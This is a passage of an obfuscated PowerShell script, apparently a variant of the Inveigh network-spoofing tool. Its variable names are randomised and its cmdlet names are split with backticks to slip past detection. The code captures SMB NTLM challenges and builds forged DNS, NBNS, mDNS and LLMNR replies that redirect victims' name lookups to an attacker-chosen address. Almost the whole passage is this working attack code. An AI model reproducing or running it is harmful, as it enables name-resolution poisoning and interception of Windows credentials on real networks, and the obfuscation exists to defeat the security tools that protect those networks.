                                $RateBabies = $null
                                $RemindHammer = $null
                                $HumorRoof = $null
                            }

                        }

                        if($ScaleAgree)
                        {   
                            $QuiltBed = Get-SMBConnection $ScaleAgree $SmashDolls $StuffSky $BattleSalt $StewSmelly "445"
                            $RateBabies = $QuiltBed[0]
                            $RemindHammer = $QuiltBed[1]
                            $HumorRoof = "$StuffSky`:$StewSmelly"
                        }

                        if($LightOval.SMB_session_table.ContainsKey("$StuffSky`:$StewSmelly"))
                        {
                            Get-NTLMResponse $ScaleAgree $NorthAmuck $StuffSky $StewSmelly 445 "SMB"
                        }
                    
                    }

                }

                # Microsoft".
                switch ($StewSmelly)
                {

                    139 
                    {

                        if($ScaleAgree)
                        {
                            $EggsExist = Get-SMBNTLMChallenge $ScaleAgree
                        }

                        if($EggsExist -and $BattleSalt -ne $StuffSky)
                        {

                            if($StuffSky -eq $SmashDolls)
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $EggsExist sent to $BattleSalt`:$BuryRustic") > $null
                            }
                            else
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $EggsExist received from $BattleSalt`:$BuryRustic") > $null
                            }

                            $LightOval.SMB_session_table."$BattleSalt`:$BuryRustic" = $EggsExist
                            $EggsExist = $null
                        }
                    
                    }

                    445
                    {

                        if($ScaleAgree)
                        {
                            $EggsExist = Get-SMBNTLMChallenge $ScaleAgree
                        }

                        if($EggsExist -and $BattleSalt -ne $StuffSky)
                        {

                            if($StuffSky -eq $SmashDolls)
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $EggsExist sent to $BattleSalt`:$BuryRustic") > $null
                            }
                            else
                            {
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $EggsExist received from $BattleSalt`:$BuryRustic") > $null
                            }

                            $LightOval.SMB_session_table."$BattleSalt`:$BuryRustic" = $EggsExist                      
                            $EggsExist = $null
                        }
                        
                    
                    }
                
                }

                if($SlimyCable -and ($BreezyDesign -contains $StewSmelly -or $BreezyDesign -contains $BuryRustic -or $BreezyDesign -contains 'All'))
                {

                    if($ScaleAgree)
                    {
                        $HangRigid = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $SpringOffer = [System.BitConverter]::GetBytes($WoodCar + 14)
                        
                        $PersonDetect = [System.BitConverter]::GetBytes([Int][Math]::Truncate($HangRigid.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($HangRigid.Milliseconds) + # Microsoft".
                            $SpringOffer +
                            $SpringOffer +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $byte_data[0..($WoodCar - 1)]

                        if($PersonDetect.Count -eq ($WoodCar + 30))
                        {

                            switch ($SlimyCable)
                            {

                                'File'
                                {

                                    try
                                    {
                                        $DogWrist.Write($PersonDetect,0,$PersonDetect.Count)    
                                    }
                                    catch
                                    {
                                        $error_message = $_.Exception.Message
                                        $error_message = $error_message -replace "`n",""
                                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                    }

                                }

                                'Memory'
                                {
                                    $LightOval.pcap.AddRange($PersonDetect) 
                                }

                            }
                            
                        }

                    }

                }

            }
                
            17 
            {  # Microsoft".
                $StewSmelly = $ToothGrowth.ReadBytes(2)
                $LittleLowly = Convert-DataToUInt16 ($StewSmelly)
                $BuryRustic = Convert-DataToUInt16 $ToothGrowth.ReadBytes(2)
                $SongsDouble = $ToothGrowth.ReadBytes(2)
                $CrawlBrainy  = Convert-DataToUInt16 ($SongsDouble)
                $ToothGrowth.ReadBytes(2) > $null
                $ScaleAgree = $ToothGrowth.ReadBytes(($CrawlBrainy - 2) * 4)

                # Microsoft".
                switch($BuryRustic)
                {

                    53 # Microsoft".
                    {
                        $WiseSquash = Get-NameQueryString 12 $ScaleAgree
                        $GrowthShiny = $ScaleAgree[12..($WiseSquash.Length + 13)]
                        [Byte[]]$SongsDouble = ([System.BitConverter]::GetBytes($GrowthShiny.Count + $GrowthShiny.Count + $StickLame.Length + 23))[1,0]
                        $JazzyArrive = "[+]"

                        $GrowthShiny += 0x00,0x01,0x00,0x01 +
                                                $GrowthShiny +
                                                0x00,0x01,0x00,0x01 +
                                                $TailCharge +
                                                0x00,0x04 +
                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
        
                        $BlotKiss = 0x00,0x35 +
                                                    $StewSmelly[1,0] +
                                                    $SongsDouble +
                                                    0x00,0x00 +
                                                    $ScaleAgree[0,1] +
                                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $GrowthShiny


                        $StageLovely = Get-SpooferResponseMessage -ExpectRitzy $WiseSquash -EarBucket "DNS" -GustyDance $HomelyShow
                        $JazzyArrive = $StageLovely[0]
                        $StageLovely = $StageLovely[1]

                        if($StageLovely -eq '[response sent]')
                        {
                            $ClaimPart = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                            $ClaimPart.SendBufferSize = 1024
                            $RaggedCloth = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly) 
                            $ClaimPart.SendTo($BlotKiss,$RaggedCloth) > $null
                            $ClaimPart.Close()
                        }

                        if($BattleSalt -eq $SmashDolls)
                        {
                            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash received from $StuffSky $StageLovely") > $null
                        }
                        else
                        {
                            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash sent to $BattleSalt [outgoing query]") > $null
                        }

                    }

                    137 # Microsoft".
                    {
                     
                        if(([System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($ScaleAgree[10..11]) -ne '00-01')
                        {

                            if([System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00')
                            {
                                $SongsDouble[0] += 12
                                $GaudyArgue = "[+]"
                            
                                $BasketDesert = $ScaleAgree[13..$ScaleAgree.Length] +
                                                        $BaitWound +
                                                        0x00,0x06,0x00,0x00 +
                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
                    
                                $KindChess = 0x00,0x89 +
                                                        $StewSmelly[1,0] +
                                                        $SongsDouble[1,0] +
                                                        0x00,0x00 +
                                                        $ScaleAgree[0,1] +
                                                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                        $BasketDesert
                    
                                $HealthIcy = [System.BitConverter]::ToString($ScaleAgree[43..44])
                                $HealthIcy = Get-NeedleSoak $HealthIcy
                                $ScarceSlow = $ScaleAgree[47]
                                $RhymeTaste = [System.BitConverter]::ToString($ScaleAgree[13..($ScaleAgree.Length - 4)])
                                $RhymeTaste = $RhymeTaste -replace "-00",""
                                $RhymeTaste = $RhymeTaste.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $UltraFail = ne`w-`obje`ct System.String ($RhymeTaste,0,$RhymeTaste.Length)
                                $SkinInnate = $UltraFail
                                $UltraFail = $UltraFail.Substring(0,$UltraFail.IndexOf("CA"))                
                                $WiseWool = $null
                                $DuckElbow = $null
                                $PluckyIce = 0
                                
                                do
                                {
                                    $UntidyCake = (([Byte][Char]($UltraFail.Substring($PluckyIce,1))) - 65)
                                    $WiseWool += ([System.Convert]::ToString($UntidyCake,16))
                                    $PluckyIce++
                                }
                                until($PluckyIce -ge ($UltraFail.Length))
                        
                                $PluckyIce = 0
                        
                                do
                                {
                                    $DuckElbow += ([Char]([System.Convert]::ToInt16($WiseWool.Substring($PluckyIce,2),16)))
                                    $PluckyIce += 2
                                }
                                until($PluckyIce -ge ($WiseWool.Length) -or $DuckElbow.Length -eq 15)

                                if($SkinInnate.StartsWith("ABAC") -and $SkinInnate.EndsWith("ACAB"))
                                {
                                    $DuckElbow = $DuckElbow.Substring(2)
                                    $DuckElbow = $DuckElbow.Substring(0, $DuckElbow.Length - 1)
                                    $DuckElbow = "<01><02>" + $DuckElbow + "<02>"
                                }

                                if($DuckElbow -notmatch '[^\x00-\x7F]+')
                                {

                                    if(!$LightOval.request_table.ContainsKey($DuckElbow))
                                    {
                                        $LightOval.request_table.Add($DuckElbow.ToLower(),[Array]$StuffSky.IPAddressToString)
                                        $LightOval.request_table_updated = $true
                                    }
                                    else
                                    {
                                        $LightOval.request_table.$DuckElbow += $StuffSky.IPAddressToString
                                        $LightOval.request_table_updated = $true
                                    }

                                }

                                $EnjoyBright = $false
                            }

                            if($PlugTour -eq 'Y' -and $LightOval.valid_host_list -notcontains $DuckElbow -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00' -and $StuffSky -ne $SmashDolls)
                            {
                            
                                if(($AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"})))
                                {
                                    $NoticeRagged = [DateTime]$AbruptWorm.Find({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"}).SubString(0,19)

                                    if((Get-Date) -ge $NoticeRagged.AddMinutes($WrongAnts))
                                    {
                                        $AbruptWorm.RemoveAt($AbruptWorm.FindIndex({param($PlantsIrate) $PlantsIrate -like "20* $DuckElbow"}))
                                        $NeatSaw = $true
                                    }
                                    else
                                    {
                                        $NeatSaw = $false
                                    }

                                }
                                else
                                {           
                                    $NeatSaw = $true
                                }

                                if($NeatSaw)
                                {
                                    $VesselBleach = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
                                    $ShakyThrone = $VesselBleach.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $VesselBleach = $VesselBleach -replace " ","-"
                                    $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
                                    $ReignType = $ScaleAgree[13..($ScaleAgree.Length - 5)]

                                    $NailTrace = $ShakyThrone +
                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                            $ReignType +
                                                            0x00,0x20,0x00,0x01

                                    $WrongCheese = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                    $HollowSquash.Connect($WrongCheese)
                                    $HollowSquash.Send($NailTrace,$NailTrace.Length)
                                    $HollowSquash.Close()
                                    $AbruptWorm.Add("$(Get-Date -format s) $VesselBleach $DuckElbow") > $null
                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $DuckElbow sent to " + $WrongCheese.Address.IPAddressToString) > $null
                                }

                            }

                            $TidyIron = Get-SpooferResponseMessage -ExpectRitzy $DuckElbow -EarBucket "NBNS" -GustyDance $PeckFirst -PiesDesk $ScarceSlow
                            $GaudyArgue = $TidyIron[0]
                            $TidyIron = $TidyIron[1]

                            if($TidyIron -eq '[response sent]')
                            {

                                if($PlugTour -eq 'N' -or !$AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
                                {
                                    $MarketPies = ne`w-`obje`ct Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $MarketPies.SendBufferSize = 1024
                                    $JarBeef = ne`w-`obje`ct Net.IPEndpoint($StuffSky,$LittleLowly)
                                    $MarketPies.SendTo($KindChess,$JarBeef) > $null
                                    $MarketPies.Close()
                                }
                                else
                                {
                                    $EnjoyBright = $true
                                }
                                
                            }
                            else
                            {
                                
                                if($StuffSky -eq $SmashDolls -and $AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
                                {
                                    $EnjoyBright = $true
                                }
                                
                            }

                            if(!$EnjoyBright -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-01-00-00')
                            {
                                $LightOval.output_queue.Add("$GaudyArgue [$(Get-Date -format s)] NBNS request for $DuckElbow<$HealthIcy> received from $StuffSky $TidyIron") > $null
                            }
                            elseif($PlugTour -eq 'Y' -and [System.BitConverter]::ToString($ScaleAgree[4..7]) -eq '00-00-00-01' -and $AbruptWorm.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
                            {
                                [Byte[]]$NameRange = $ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length)]
                                $SticksTongue = [System.Net.IPAddress]$NameRange
                                $SticksTongue = $SticksTongue.IPAddressToString

                                if($LightOval.valid_host_list -notcontains $DuckElbow)
                                {
                                    $LightOval.valid_host_list.Add($DuckElbow) > $null
                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $SticksTongue for $DuckElbow received from $StuffSky [added to valid host list]") > $null
                                }

                            }

                        }

                    }

                    5353 # Microsoft".
                    {   
                        
                        if(([System.BitConverter]::ToString($ScaleAgree)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($ScaleAgree[4..11]) -eq "00-01-00-00-00-00-00-00")
                        {
                            $SongsDouble[0] += 10
                            $FuelMate = Get-NameQueryString 12 $ScaleAgree
                            $DailyDrag = $ScaleAgree[12..($FuelMate.Length + 13)]
                            $ClubSave = ($FuelMate.Split("."))[0]
                            $SongsDouble[0] = $DailyDrag.Count + $StickLame.Length + 23
                            $FriendSquare = "[+]"

                            $ThinHarm = $DailyDrag +
                                                    0x00,0x01,0x00,0x01 +
                                                    $PourDesign +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
                        
                            $CureGood = 0x14,0xe9 +
                                                    $StewSmelly[1,0] +
                                                    $SongsDouble[1,0] +
                                                    0x00,0x00 +
                                                    $ScaleAgree[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $ThinHarm
                            

                            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QU" -GustyDance $BoilClever
                            $FriendSquare = $BabyFlap[0]
                            $BabyFlap = $BabyFlap[1]
                            
                            if($BabyFlap -eq '[response sent]')
                            {
                                $PlaneUnused = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                $PlaneUnused.SendBufferSize = 1024
                                $UnableIcy = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly)
                                $PlaneUnused.SendTo($CureGood,$UnableIcy) > $null
                                $PlaneUnused.Close()
                            }

                            $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QU) request $FuelMate received from $StuffSky $BabyFlap") > $null
                        }
                        elseif(([System.BitConverter]::ToString($ScaleAgree)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
                            $ScaleAgree[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($ScaleAgree[4..11]) -eq "00-02-00-00-00-00-00-00"))
                        {
                            $FuelMate = Get-NameQueryString 12 $ScaleAgree
                            $DailyDrag = $ScaleAgree[12..($FuelMate.Length + 13)]
                            $ClubSave = ($FuelMate.Split("."))[0]
                            $SongsDouble[0] = $DailyDrag.Count + $StickLame.Length + 23
                            $FriendSquare = "[+]"

                            $ThinHarm = $DailyDrag +
                                                    0x00,0x01,0x80,0x01 +
                                                    $PourDesign +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()

                        
                            $CureGood = 0x14,0xe9 +
                                                    $StewSmelly[1,0] +
                                                    $SongsDouble[1,0] +
                                                    0x00,0x00 +
                                                    $ScaleAgree[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $ThinHarm
                   
                            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QM" -GustyDance $BoilClever
                            $FriendSquare = $BabyFlap[0]
                            $BabyFlap = $BabyFlap[1]
                            
                            if($BabyFlap -eq '[response sent]')
                            {
                                $PlaneUnused = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                $PlaneUnused.SendBufferSize = 1024
                                $UnableIcy = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                                $PlaneUnused.SendTo($CureGood,$UnableIcy) > $null
                                $PlaneUnused.Close()
                            }

                            $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QM) request $FuelMate received from $StuffSky $BabyFlap") > $null
                        }
                        
                    }

                    5355 # Microsoft".
                    {

                        if([System.BitConverter]::ToString($ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length - 3)]) -ne '00-1c') # Microsoft".
                        {
                            $SongsDouble[0] += $ScaleAgree.Length - 2
                            $TenFish = $ScaleAgree[12..$ScaleAgree.Length]
                            $LooseMarked = "[+]"

                            $TenFish += $TenFish +
                                                    $CheapSuperb +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
            
                            $MonkeyBounce = 0x14,0xeb +
                                                        $StewSmelly[1,0] +
                                                        $SongsDouble[1,0] +
                                                        0x00,0x00 +
                                                        $ScaleAgree[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        $TenFish
                
                            $BeamWild = [System.Text.Encoding]::UTF8.GetString($ScaleAgree[13..($ScaleAgree.Length - 4)]) -replace "`0",""

                            if(!$LightOval.request_table.ContainsKey($BeamWild))
                            {
                                $LightOval.request_table.Add($BeamWild.ToLower(),[Array]$StuffSky.IPAddressToString)
                                $LightOval.request_table_updated = $true
                            }
                            else
                            {
                                $LightOval.request_table.$BeamWild += $StuffSky.IPAddressToString
                                $LightOval.request_table_updated = $true
                            }

                            $FaxYarn = $false
                
                            if($PlugTour -eq 'Y' -and $LightOval.valid_host_list -notcontains $BeamWild -and $StuffSky -ne $SmashDolls)
                            {

                                if(($BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"})))
                                {
                                    $RottenBlood = [DateTime]$BaseNumber.Find({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"}).SubString(0,19)

                                    if((Get-Date) -ge $RottenBlood.AddMinutes($WrongAnts))
                                    {
                                        $BaseNumber.RemoveAt($BaseNumber.FindIndex({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"}))
                                        $RabbitCake = $true
                                    }
                                    else
                                    {
                                        $RabbitCake = $false
                                    }

                                }
                                else
                                {           
                                    $RabbitCake = $true
                                }
                                
                                if($RabbitCake)
                                {
                                    $NimbleFail = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
                                    $SipNail = $NimbleFail.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $NimbleFail = $NimbleFail -replace " ","-"
                                    $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
                                    $OpenHop = $ScaleAgree[13..($ScaleAgree.Length - 5)]

                                    $SofaAnnoy = $SipNail +
                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                            ($OpenHop.Length - 1) +
                                                            $OpenHop +
                                                            0x00,0x01,0x00,0x01

                                    $HatStew = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                    $MarkMatter.Connect($HatStew)
                                    $MarkMatter.Send($SofaAnnoy,$SofaAnnoy.Length)
                                    $MarkMatter.Close()
                                    $BaseNumber.Add("$(Get-Date -format s) $NimbleFail $BeamWild") > $null
                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $BeamWild sent to 224.0.0.252") > $null
                                }

                            }

                            $StitchYak = Get-SpooferResponseMessage -ExpectRitzy $BeamWild -EarBucket "LLMNR" -GustyDance $LipMeat
                            $LooseMarked = $StitchYak[0]
                            $StitchYak = $StitchYak[1]

                            if($StitchYak -eq '[response sent]')
                            {

                                if($PlugTour -eq 'N' -or !$BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
                                {
                                    $IckyFilm = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $IckyFilm.SendBufferSize = 1024
                                    $BucketSkate = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly) 
                                    $IckyFilm.SendTo($MonkeyBounce,$BucketSkate) > $null
                                    $IckyFilm.Close()
                                }
                                else
                                {
                                    $FaxYarn = $true
                                }

                            }
                           
                            if(!$FaxYarn)
                            {
                                $LightOval.output_queue.Add("$LooseMarked [$(Get-Date -format s)] LLMNR request for $BeamWild received from $StuffSky $StitchYak") > $null
                            }

                        }

                    }

                }

                switch($LittleLowly)
                {

                    5355 # Microsoft".
                    {
                    
                        if($PlugTour -eq 'Y' -and $BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
                        {
                            $BeamWild = [System.Text.Encoding]::UTF8.GetString($ScaleAgree[13..($ScaleAgree.Length - 4)]) -replace "`0",""
                            [Byte[]]$WriterAgree = $ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length)]
                            $CauseGround = [System.Net.IPAddress]$WriterAgree
                            $CauseGround = $CauseGround.IPAddressToString
                            
                            if($LightOval.valid_host_list -notcontains $BeamWild)
                            {
                                $LightOval.valid_host_list.Add($BeamWild) > $null
                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $BeamWild LLMNR response $CauseGround received from $StuffSky [added to valid host list]") > $null
                            }
                            
                        }

                    }

                }

                if($SlimyCable -and ($FairAblaze -contains $LittleLowly -or $FairAblaze -contains $BuryRustic -or $FairAblaze -contains 'All'))
                {

                    if($ScaleAgree)
                    {
                        $HangRigid = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $SpringOffer = [System.BitConverter]::GetBytes($WoodCar + 14)
                        
                        $PersonDetect = [System.BitConverter]::GetBytes([Int][Math]::Truncate($HangRigid.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($HangRigid.Milliseconds) + # Microsoft".
                            $SpringOffer +
                            $SpringOffer +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $byte_data[0..($WoodCar - 1)]

                        switch ($SlimyCable)
                        {

                            'File'
                            {

                                try
                                {
                                    $DogWrist.Write($PersonDetect,0,$PersonDetect.Count)    
                                }
                                catch
                                {
                                    $error_message = $_.Exception.Message
                                    $error_message = $error_message -replace "`n",""
                                    $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                }
                        
                            }

                            'Memory'
                            {
                                $LightOval.pcap.AddRange($PersonDetect) 
                            }

                        }

                    }

                }

            }

        }

    }

    $ToothGrowth.Close()
    $FowlTrust.Dispose()
    $FowlTrust.Close()
    $DogWrist.Close()
}

# Microsoft".
$PressScream = 
{
    param ($MeekSmoggy,$HandsHop,$StickLame)

    $NationSlow = $true
    $PiesSide = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,53)

    try
    {
        $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $NationSlow = $false
    }

    $PersonScale.Client.ReceiveTimeout = 5000
    $TailCharge = [System.BitConverter]::GetBytes($HandsHop)
    [Array]::Reverse($TailCharge)

    while($LightOval.running -and $NationSlow)
    {   

        try
        {
            $SnatchChief = $PersonScale.Receive([Ref]$PiesSide)
        }
        catch
        {
            $PersonScale.Close()
            $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
            $PersonScale.Client.ReceiveTimeout = 5000
        }
        
        if($SnatchChief -and [System.BitConverter]::ToString($SnatchChief[10..11]) -ne '00-01')
        {
            $WiseSquash = Get-NameQueryString 12 $SnatchChief
            $GrowthShiny = $SnatchChief[12..($WiseSquash.Length + 13)]
            $JazzyArrive = "[+]"

            $BlotKiss = $SnatchChief[0,1] +
                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $GrowthShiny +
                                    0x00,0x01,0x00,0x01 +
                                    $GrowthShiny +
                                    0x00,0x01,0x00,0x01 +
                                    $TailCharge +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()

            $StuffSky = $PiesSide.Address
            $StageLovely = Get-SpooferResponseMessage -ExpectRitzy $WiseSquash -EarBucket "DNS" -GustyDance $HomelyShow
            $JazzyArrive = $StageLovely[0]
            $StageLovely = $StageLovely[1]

            if($StageLovely -eq '[response sent]')
            {
                $SealMass = ne`w-`obje`ct System.Net.IPEndpoint($PiesSide.Address,$PiesSide.Port)
                $PersonScale.Connect($SealMass)
                $PersonScale.Send($BlotKiss,$BlotKiss.Length)
                $PersonScale.Close()
                $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
                $PersonScale.Client.ReceiveTimeout = 5000
            }
           
            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash received from $StuffSky $StageLovely") > $null
            $SnatchChief = $null
        }
        
    }

    $PersonScale.Close()
}

# Microsoft".
$UsedMice = 
{
    param ($MeekSmoggy,$TeaseNasty,$StickLame,$BikeLoud,$HoleRoute,$WoozyClose,$ObeyAttack,$JokeFaulty)

    $FowlIcky = $true
    $YamGuitar = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)

    try
    {
        $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
        $MarkMatter.ExclusiveAddressUse = $false
        $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $MarkMatter.Client.Bind($YamGuitar)
    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $FowlIcky = $false
    }

    $PassCoil = [IPAddress]"224.0.0.252"
    $MarkMatter.JoinMulticastGroup($PassCoil)
    $MarkMatter.Client.ReceiveTimeout = 5000
    $CheapSuperb = [System.BitConverter]::GetBytes($TeaseNasty)
    [Array]::Reverse($CheapSuperb)

    while($LightOval.running -and $FowlIcky)
    {   

        try
        {
            $SixTrade = $MarkMatter.Receive([Ref]$YamGuitar)
        }
        catch
        {      
            $MarkMatter.Close()
            $YamGuitar = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)
            $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
            $MarkMatter.ExclusiveAddressUse = $false
            $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $MarkMatter.Client.Bind($YamGuitar)
            $PassCoil = [IPAddress]"224.0.0.252"
            $MarkMatter.JoinMulticastGroup($PassCoil)
            $MarkMatter.Client.ReceiveTimeout = 5000
        }

        if($SixTrade -and [System.BitConverter]::ToString($SixTrade[($SixTrade.Length - 4)..($SixTrade.Length - 3)]) -ne '00-1c') # Microsoft".
        {

            $MonkeyBounce = $SixTrade[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     $SixTrade[12..$SixTrade.Length] +
                                     $SixTrade[12..$SixTrade.Length] +
                                     $CheapSuperb +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
        
            $BeamWild = [Text.Encoding]::UTF8.GetString($SixTrade[13..($SixTrade[12] + 12)])     
            $StuffSky = $YamGuitar.Address
            $LooseMarked = "[+]"

            if(!$LightOval.request_table.ContainsKey($BeamWild))
            {
                $LightOval.request_table.Add($BeamWild.ToLower(),[Array]$StuffSky.IPAddressToString)
                $LightOval.request_table_updated = $true
            }
            else
            {
                $LightOval.request_table.$BeamWild += $StuffSky.IPAddressToString
                $LightOval.request_table_updated = $true
            }

            $StitchYak = Get-SpooferResponseMessage -ExpectRitzy $BeamWild -EarBucket "LLMNR" -GustyDance $LipMeat
            $LooseMarked = $StitchYak[0]
            $StitchYak = $StitchYak[1]

            if($StitchYak -eq '[response sent]')
            {
                $HelpClap = ne`w-`obje`ct Net.IPEndpoint($YamGuitar.Address,$YamGuitar.Port)
                $MarkMatter.Connect($HelpClap)
                $MarkMatter.Send($MonkeyBounce,$MonkeyBounce.Length)
                $MarkMatter.Close()
                $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
                $MarkMatter.ExclusiveAddressUse = $false
